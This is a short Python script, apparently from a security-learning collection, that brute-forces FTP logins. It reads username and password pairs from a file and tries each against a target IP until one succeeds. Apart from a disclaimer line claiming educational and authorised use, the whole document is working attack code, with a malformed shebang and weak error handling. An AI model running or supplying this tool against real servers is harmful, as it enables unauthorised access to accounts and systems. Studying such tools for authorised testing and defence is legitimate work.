#!usr/bin/python3
# Disclaimer: Educational & authorized testing only, see DISCLAIMER.md

import ftplib
from termcolor import cprint

def bruteLogin(hostname, passwdFile):
	try:
		pF = open((passwdFile), "r")
	except:
		cprint("[!] File doesn't exist !", 'red')
	for line in pF.readlines():
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\n')
		cprint("[+] Trying: " + userName + "/" + passWord, 'yellow')
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(userName, passWord)
			cprint("[+] Login succeeded with: " + userName + "/" + passWord, 'green')
			ftp.quit()
			return(userName,passWord)
		except:
			pass #on ne fait rien
	cprint("[-] Password not in list", 'red') #si aucun mdp n'a fonctionne

host = input("[*] Enter targets IP address: ")
passwdFile = input("[*] Enter User/passord file path: ")
bruteLogin(host, passwdFile)
